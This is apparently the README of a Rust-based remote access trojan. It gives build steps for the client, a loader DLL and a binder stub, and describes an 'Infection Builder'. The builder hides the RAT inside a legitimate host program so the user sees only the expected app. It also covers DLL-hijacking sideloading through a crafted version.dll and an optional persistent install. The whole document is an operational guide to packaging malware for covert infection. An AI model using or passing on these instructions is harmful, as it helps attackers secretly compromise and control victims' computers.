# Prerequisites

You need to have project’s source code and the the following tools installed:

- Rust (https://www.rust-lang.org/tools/install)
- Node.js (https://nodejs.org/en/download/package-manager)
  Navigate to the server folder located at the root of the project's source code.
  Then install the Node.js packages for the front-end by running the command npm install.

# Compiling

To begin, navigate to the root folder of the project. For compiling the client, server, and stubs, use the command `cargo build`, which by default builds the source code in debug mode. To compile in release mode, add the `--release` parameter.

### Build Order (Important for Infection Builder)
If you plan to use the Infection Builder, follow this build order:

1.  **Client**: `cargo build -p client --release`
2.  **Stubs**:
    -   `cargo build -p dll_stub --release` (This creates the loader DLL)
    -   `cargo build -p binder_stub --release` (This creates the bundling executable)
3.  **Prepare Stubs**: Copy the compiled stubs from `target/release/` to the same folder where your server executable will run (or a `stub` subfolder):
    -   `target/release/dll_stub.dll` -> `dll_stub.dll` (next to server)
    -   `target/release/binder_stub.exe` -> `binder_stub.exe` (next to server)
4.  **Server**: `cargo build -p server --release` (or use `npm run tauri build` for a full installer)

The compiled binaries will be located under the `target` folder.

# Infection Modes

The Infection Builder (found in Settings -> Client Builder -> Infect) offers two primary methods:

### 1. Single File (Bundled)
This mode creates a single `.exe` file that contains both your selected host application (e.g., a calculator) and the RAT client.
- **Functionality**: When the user runs the bundled file, it extracts the host and a loader DLL to a temporary directory and launches them.
- **User Experience**: The user sees the original application running as expected, while the client runs silently in the background.

### 2. Sideload (2 Files)
This mode prepares a directory containing the original host executable and a specially crafted loader DLL (e.g., `version.dll`).
- **Functionality**: It relies on standard Windows DLL search order (DLL hijacking). When the host EXE is launched, it automatically loads the DLL in the same directory, which then executes the RAT client.

**Volatile vs. Persistent**:
- If "Install" is **enabled** in the builder, the client will attempt to install itself permanently on the system.
- If "Install" is **disabled**, the client runs in **Volatile Mode**. In this mode, the client is tied to the host's lifecycle; if the host application is closed or crashes, the client will be automatically terminated (using Windows Job Objects).

# Releasing for production

To release the code for production, consider the following steps. Compiling the server in release mode is not recommended for a Tauri project, as it's simpler to create a Windows installer without extra folders from the compiling process. Instead of removing unnecessary files and folders from the release folder, it's more efficient to use the built tools directly.  
First of all, you need to run the `prepare_prod_build.bat` script. This will prepare the release for the server.
Navigate to the server directory, open a command prompt, and run `npm run tauri build`. (Make sure to have npm packages installed by running `npm install` in the server directory.) This command should produce two bundles: an MSI installer and an NSIS installer. You may use either.

# Working on the code

If you prefer to skip the compilation process and run both the server and client projects immediately, use the `cargo run` command with the same parameters as the build command. For the server project, since the front-end is a Node.js project, run it in development mode for hot reloading (useful if making changes to the front-end) by navigating to the server folder and executing `npm run dev`.
